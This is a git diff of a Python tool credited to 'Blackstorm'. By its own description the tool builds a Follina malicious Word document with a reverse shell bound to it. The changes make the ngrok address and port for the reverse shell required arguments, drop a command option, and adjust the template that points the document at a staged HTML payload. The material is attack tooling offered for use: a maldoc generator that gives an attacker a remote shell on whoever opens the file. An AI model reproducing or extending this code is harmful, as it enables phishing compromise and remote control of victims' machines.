@@ -24,16 +24,10 @@ cprint("""
  |/                                                                                    
 by Blackstorm""", 'green')
 
-parser = argparse.ArgumentParser()
+parser = argparse.ArgumentParser(description='This script is used to make a follina malicious word document with reverse shell binded on it.',epilog="I hope you enjoy your maldoc!")
 
 
 
-parser.add_argument(
-    "--command",
-    "-c",
-    help="command to run on the target",
-    
-)
 
 parser.add_argument(
     "--output",
@@ -51,17 +45,21 @@ parser.add_argument(
 )
 
 parser.add_argument(
-    "--port",
-    "-p",
-    type=int,
-    help="Provide ngrok tcp reverse port",
+    "--ip",
+    "-i",
+    required=True,
+    help="provide ngrok tcp address",
 )
 
 parser.add_argument(
-    "--ip",
-    "-i",
-    help="provide ngrok tcp address",
+    "--port",
+    "-p",
+    type=int,
+    required=True,
+    help="Provide ngrok tcp reverse port",
 )
+
+
 
 port = 80
 reverse  = 1337
@@ -89,7 +87,6 @@ def main(args):
         external_referral = filp.read()
 
     external_referral = external_referral.replace(
-        # "{staged_html}", f"http://{serve_host}:{args.port}/index.html"
         "{staged_html}", f"{serve_host}/index.html"
 
     )
